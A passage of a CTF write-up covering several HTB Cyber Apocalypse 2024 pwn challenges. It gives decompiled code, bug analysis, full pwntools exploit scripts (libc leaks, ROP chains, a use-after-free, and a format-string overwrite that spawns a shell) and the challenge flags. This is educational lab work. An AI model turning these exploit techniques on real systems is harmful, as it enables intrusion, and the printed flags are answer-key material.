 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39

```


```
from pwn import *
context.terminal = ['wezterm.exe', 'cli', 'split-pane', '--right', '--percent', '65']
remote_url = '94.237.54.161'
remote_port = 32566
gdbscript = '''
b *main+46
'''

def conn():
    if args.LOCAL:
        r = process(['./sound_of_silence'])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

exe = ELF('./sound_of_silence')

r = conn()

menu_delim = b'> '
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

mov_rdi_rax_call_system = 0x401169

payload = b'/bin/sh'.ljust(0x20, b'\x00')
payload += p64(exe.bss()+0x50)
payload += p64(mov_rdi_rax_call_system) # rax is still pointing to the address of our payload
sla(b'>>', payload)
r.interactive()

```


>


**Flag: HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}


## Deathnote


            *Description*


            You stumble upon a mysterious and ancient tome, said to hold the secret to vanquishing your enemies. Legends speak of its magic powers, but cautionary tales warn of the dangers of misuse.


### Initial Analysis


In this challenge, we were given a binary named `deathnote`. Let’s try to disassemble the binary.


**main


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rax
  __int64 v5[12]; // [rsp+10h] [rbp-60h] BYREF

  v5[11] = __readfsqword(0x28u);
  memset(v5, 0, 80);
  while ( 1 )
  {
    while ( 1 )
    {
      v3 = menu();
      if ( v3 != 42 )
        break;
      _(v5);
    }
    if ( v3 > 0x2A )
    {
LABEL_13:
      error("Invalid choice!\n");
    }
    else if ( v3 == 3 )
    {
      show(v5);
    }
    else
    {
      if ( v3 > 3 )
        goto LABEL_13;
      if ( v3 == 1 )
      {
        add(v5);
      }
      else
      {
        if ( v3 != 2 )
          goto LABEL_13;
        delete(v5);
      }
    }
  }
}

```


In this challenge, we have access to three menus. Let’s examine each menu option one by one.


**add


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28

```


```
unsigned __int64 __fastcall add(__int64 a1)
{
  unsigned __int8 v2; // [rsp+15h] [rbp-1Bh]
  unsigned __int16 num; // [rsp+16h] [rbp-1Ah]
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  get_empty_note(a1);
  printf(aHowBigIsYourRe);
  num = read_num();
  if ( num > 1u && num <= 0x80u )
  {
    printf(aPage);
    v2 = read_num();
    if ( (unsigned __int8)check_idx(v2) == 1 )
    {
      *(_QWORD *)(8LL * v2 + a1) = malloc(num);
      printf(aNameOfVictim);
      read(0, *(void **)(8LL * v2 + a1), num - 1);
      printf("%s\n[!] The fate of the victim has been sealed!%s\n\n", "\x1B[1;33m", "\x1B[1;36m");
    }
  }
  else
  {
    error("Don't play with me!\n");
  }
  return v4 - __readfsqword(0x28u);
}

```


The first is a typical `add` function. We can allocate a chunk of up to `0x80` in size and populate it. This chunk is then stored in an array located in the `main` function’s stack. We’ll refer to this array as `pages`.


**show


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17

```


```
unsigned __int64 __fastcall show(__int64 a1)
{
  unsigned __int8 num; // [rsp+17h] [rbp-9h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf(aPage);
  num = read_num();
  if ( (unsigned __int8)check_idx(num) == 1 )
  {
    if ( *(_QWORD *)(8LL * num + a1) )
      printf("\nPage content: %s\n", *(const char **)(8LL * num + a1));
    else
      error("Page is empty!\n");
  }
  return v3 - __readfsqword(0x28u);
}

```


The second function allows us to view the content of a selected chunk.


**delete


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18

```


```
unsigned __int64 __fastcall delete(__int64 a1)
{
  unsigned __int8 num; // [rsp+17h] [rbp-9h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf(aPage);
  num = read_num();
  if ( (unsigned __int8)check_idx(num) == 1 )
  {
    if ( *(_QWORD *)(8LL * num + a1) )
      printf("%s\nRemoving page [%d]\n\n%s", "\x1B[1;32m", num, "\x1B[1;36m");
    else
      error("Page is already empty!\n");
    free(*(void **)(8LL * num + a1));
  }
  return v3 - __readfsqword(0x28u);
}

```


The third function enables us to delete a chosen chunk by freeing it. However, there’s a bug here: after freeing the chunk, it’s not removed from the array, leading to a Use-After-Free (UAF) vulnerability.


Additionally, a hidden function is discovered, named `_`.


**_


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26

```


```
unsigned __int64 __fastcall _(__int64 a1)
{
  void (__fastcall *v2)(_QWORD); // [rsp+18h] [rbp-18h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("\x1B[1;33m");
  cls();
  printf(asc_2750, "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;36m");
  v2 = (void (__fastcall *)(_QWORD))strtoull(*(const char **)a1, 0LL, 16);
  if ( v2 || **(_BYTE **)a1 == '0' || *(_BYTE *)(*(_QWORD *)a1 + 1LL) == 'x' )
  {
    if ( !*(_QWORD *)a1 || !*(_QWORD *)(a1 + 8) )
    {
      error("What you are trying to do is unacceptable!\n");
      exit(1312);
    }
    puts(aExecuting);
    v2(*(_QWORD *)(a1 + 8));
  }
  else
  {
    puts("Error: Invalid hexadecimal string");
  }
  return v3 - __readfsqword(0x28u);
}

```


This function reads the content of the first entry in the `array` that stores the `page` added via the `add()` function. It will:


- Interpret the string stored in `pages[0]` as hexadecimal, then convert it into a hexadecimal number.

- Execute it by passing the value stored in `pages[1]` as the argument.


This functionality essentially allows us to execute `pages[0](pages[1])`, meaning if we can place a valid function address in `pages[0]`, we can achieve code execution.


Now that we know the bug, let’s move to the exploitation part.


### Solution


The strategy involves exploiting the Use-After-Free vulnerability to leak libc addresses. We’ll fill the `tcachebins[0x90]` with up to `7` entries, so the eighth free operation moves the chunk to the `unsortedbin`, causing the freed chunk to contain a pointer to a libc address.


By using the `show` function, due to the UAF, we can view the content of this eighth freed chunk, enabling us to leak a libc address. Next, with the `add` functionality, we set `pages[0]` to the hexadecimal string representation of `system`, set `pages[1]` to the string `/bin/sh`, and invoke the `_` function to trigger code execution.


Below is the full script used for exploitation:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85

```


```
from pwn import *

exe = ELF("deathnote_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
context.terminal = ['wezterm.exe', 'cli', 'split-pane', '--right', '--percent', '65']
warnings.simplefilter("ignore")

remote_url = "83.136.249.57"
remote_port = 30276
gdbscript = '''
b *_+296
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'\xf0\x9f\x92\x80 '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

def add(sz, idx, val):
    menu(1)
    sla(menu_delim, sn(sz))
    sla(menu_delim, sn(idx))
    sla(menu_delim, val)

def delete(idx):
    menu(2)
    sla(menu_delim, sn(idx))

def show(idx):
    menu(3)
    sla(menu_delim, sn(idx))
    r.recvuntil(b'content: ')
    return r.recvline().strip()

# Allocate 9 chunks
for i in range(9):
    info(f'add-{i}')
    add(0x80, i, b'/bin/sh\x00')

# Fulfill tcache
for i in range(7):
    info(f'del-{i}')
    delete(i)

# This free will put the freed chunk to unsorted bin
info(f'del-{7}')
delete(7)

# With the UAF bug, use `show()` to get a libc leak
info(f'leak...')
libc.address = u64(show(7)[:6].ljust(8, b'\x00')) - (libc.symbols['main_arena']+96)
logleak('libc.address', libc.address)
logleak('system', libc.sym.system)

# Setup pages[0] and pages[1], then trigger the `_` func
add(0x50, 0, hex(libc.sym.system)[2:].encode())
add(0x50, 1, b'/bin/sh\x00')

# Execute pages[0](pages[1])
menu(42)

r.interactive()

```


>


**Flag: HTB{0m43_w4_m0u_5h1nd31ru~uWu}


## Rocket Blaster XXX [easy]


            *Description*


            Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray—let the fight commence!


### Initial Analysis


In this challenge, we were given a binary named `rocket_blaster_xxx`. Let’s try to disassemble the binary.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF

  banner(argc, argv, envp);
  memset(buf, 0, sizeof(buf));
  fflush(_bss_start);
  printf(
    "\n"
    "Prepare for trouble and make it double, or triple..\n"
    "\n"
    "You need to place the ammo in the right place to load the Rocket Blaster XXX!\n"
    "\n"
    ">> ");
  fflush(_bss_start);
  read(0, buf, 0x66uLL);
  puts("\nPreparing beta testing..");
  return 0;
}

```


As you can see, there is an obvious `buffer overflow` bug again. Let’s check the binary mitigation.


```
1
2
3
4
5
6

```


```
╰─❯ checksec rocket_blaster_xxx
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```


We can see that the binary is `No PIE`, meaning that we can extract some gadgets from the binary and use it without any leak. Based on these two information, we can start crafting our exploit.


### Solution


Upon checking through the gadgets with `ropr`, we can see two interesting gadgets:


```
1
2

```


```
0x0040159d: pop rsi; ret;
0x0040159f: pop rdi; ret;

```


Using these two gadgets, we can do ROP chain leveraging the buffer overflow bug. The first ROP chain is we will control the program execution flow so that it will:


- Call `puts(puts_got)` to get a `libc` leak.

- Return back to `main`, so that we can trigger once again the buffer overflow

- Prepare a ROP chain to call `system("/bin/sh")`.


Below is the full script with detailed comment:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64

```


```
from pwn import *

exe = ELF("rocket_blaster_xxx_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "94.237.54.183"
remote_port = 41539
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

pop_rdi = 0x000000000040159f
pop_rsi = 0x000000000040159d

# 1st ROP: Leak libc via puts, then return back to main
payload = b'a'*0x20
payload += p64(exe.bss()+0x100)
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.main)
sla(b'>> ', payload)
r.recvuntil(b'\nPreparing beta testing..\n')
libc.address = u64(r.recv(6).ljust(8, b'\x00')) - libc.sym.puts
logleak('libc.address', libc.address)

# 2nd ROP: Call system("/bin/sh")
payload = b'a'*0x20
payload += p64(exe.bss()+0x100)
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym.system)
sla(b'>> ', payload)

r.interactive()

```


>


**Flag: HTB{b00m_b00m_r0ck3t_2_th3_m00n}


## Pet Companion [easy]


            *Description*


            Embark on a journey through this expansive reality, where survival hinges on battling foes. In your quest, a loyal companion is essential. Dogs, mutated and implanted with chips, become your customizable allies. Tailor your pet’s demeanor—whether happy, angry, sad, or funny—to enhance your bond on this perilous adventure.


### Initial Analysis


In this challenge, we were given a binary named `pet_companion`. Let’s try to disassemble the binary.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf[8]; // [rsp+0h] [rbp-40h] BYREF

  setup(argc, argv, envp);
  memset(buf, 0, sizeof(buf));
  write(1, "\n[!] Set your pet companion's current status: ", 0x2EuLL);
  read(0, buf, 0x100uLL);
  write(1, "\n[*] Configuring...\n\n", 0x15uLL);
  return 0;
}

```


There is an obvious buffer overflow in here. Another thing to check is the binary mitigation.


```
1
2
3
4
5
6

```


```
╰─❯ checksec pet_companion
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```


We can see that the binary is `No PIE`, meaning that we can extract some gadgets from the binary and use it without any leak. Based on these two information, we can start crafting our exploit.


### Solution


Upon checking through the gadgets with `ropr`, we can see two interesting gadgets:


```
1
2

```


```
0x00400741: pop rsi; pop r15; ret;
0x00400743: pop rdi; ret;

```


Using these two gadgets, we can do ROP chain leveraging the buffer overflow bug. The first ROP chain is we will control the program execution flow so that it will:


- Call `write` to leak the `read` got address.

- Return back to `main`, so that we can trigger once again the buffer overflow

- Prepare a ROP chain to call `system("/bin/sh")`.


Below is the full script with detailed comment:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63

```


```
from pwn import *

exe = ELF("pet_companion_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "94.237.56.248"
remote_port = 44146
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

pop_rdi = 0x0000000000400743
pop_rsi_r15 = 0x0000000000400741

# 1st ROP: Leak read via write, then back to main
payload = b'a'*0x40
payload += p64(exe.bss()+0x100)
payload += p64(pop_rsi_r15)
payload += p64(exe.got.read)
payload += p64(0)
payload += p64(exe.plt.write)
payload += p64(exe.sym.main)
sla(b': ', payload)
r.recvuntil(b'Configuring...\n\n')
libc.address = u64(r.recv(6).ljust(8, b'\x00')) - libc.sym.read
logleak('libc.address', libc.address)

# 2nd ROP: Execute system("/bin/sh")
payload = b'a'*0x40
payload += p64(exe.bss()+0x100)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym.system)
sla(b': ', payload)
r.interactive()

```


>


**Flag: HTB{c0nf1gur3_w3r_d0g}


## Writing on the Wall [very easy]


            *Description*


            As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door’s secrets?


### Initial Analysis


In this challenge, we were given a binary named `writing_on_the_wall`. Let’s try to disassemble the binary.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[6]; // [rsp+Ah] [rbp-16h] BYREF
  char s2[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  *(_QWORD *)s2 = ' ssapt3w';
  read(0, buf, 7uLL);
  if ( !strcmp(buf, s2) )
    open_door();
  else
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  return 0;
}

unsigned __int64 open_door()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
    exit(1);
  }
  printf("You managed to open the door! Here is the password for the next one: ");
  while ( read(fd, &buf, 1uLL) > 0 )
    fputc(buf, _bss_start);
  close(fd);
  return v3 - __readfsqword(0x28u);
}

```


The objective here is to circumvent the `strcmp(buf, s2)` check, thereby activating the `open_door()` function, which consequently reveals the flag. The underlying issue lies in the fact that the `buf` size is actually `0x6`, presenting an opportunity for a one-byte overflow, which can be leveraged to modify the first character of `s2`.


### Solution


To tackle this challenge, sending `b'\x00'*7` as the input effectively sets the first character of `s2` to a NULL-terminator. As a result, the `strcmp(buf, s2)` operation compares two NULL strings, successfully bypassing the condition.


Below is the complete script I used:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42

```


```
from pwn import *

exe = ELF("writing_on_the_wall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "83.136.254.142"
remote_port = 36857
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

sla(b'>> ', b'\x00'*7)

r.interactive()

```


>


**Flag: HTB{3v3ryth1ng_15_r34d4bl3}


## Delulu [very easy]


            *Description*


            HALT! Recognition protocol initiated. Please present your face for scanning.


### Initial Analysis


In this challenge, we were given a binary named `delulu`. Our first step is to disassemble the binary to understand its workings.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4[2]; // [rsp+0h] [rbp-40h] BYREF
  __int64 buf[6]; // [rsp+10h] [rbp-30h] BYREF

  buf[5] = __readfsqword(0x28u);
  v4[0] = 0x1337BABELL;
  v4[1] = (__int64)v4;
  memset(buf, 0, 32);
  read(0, buf, 0x1FuLL);
  printf("\n[!] Checking.. ");
  printf((const char *)buf);
  if ( v4[0] == 0x1337BEEF )
    delulu();
  else
    error("ALERT ALERT ALERT ALERT\n");
  return 0;
}

unsigned __int64 delulu()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
    exit(1);
  }
  printf("You managed to deceive the robot, here's your new identity: ");
  while ( read(fd, &buf, 1uLL) > 0 )
    fputc(buf, _bss_start);
  close(fd);
  return v3 - __readfsqword(0x28u);
}

```


Based on reading the above code, we can see that the objective is to modify the value of `v4[0]` from `0x1337BABE` to `0x1337BEEF`. This change triggers the `delulu()` function, which in turn, prints the flag. Notably, the binary contains a `format string` vulnerability. Additionally, it’s observed that `v4[1]` holds the address of `v4[0]`, the exact location we aim to manipulate.


### Solution


To exploit this challenge, leveraging the format string vulnerability is key. Through manual inspection, `%7$p` reveals the value of `v4[1]`, which is effectively `v4[0]`. To precisely overwrite the last two bytes of `v4[0]`, sending the input `%48879c%7$hn` to the challenge suffices. The directive `%48879c` generates `0xBEEF` worth of space characters, followed by `%7$hn` which alters the referenced address value (in this instance, `v4[0]`) to match the count of characters printed so far (which amounts to `0xBEEF` characters). Successfully executing this sequence overwrites `v4[0]`, enabling us to retrieve the flag.

>


**Flag: HTB{m45t3r_0f_d3c3pt10n}


# Social Media


Follow me on twitter


                Share on**


        * Writeup, Cyber Apocalypse, Htb, Pwn, Heap, Bof, ROP, Qemu, Srop, Tls Dtor


    *GCC CTF 2024
            *Cyber Apocalypse 2024: Crypto


            *

        **
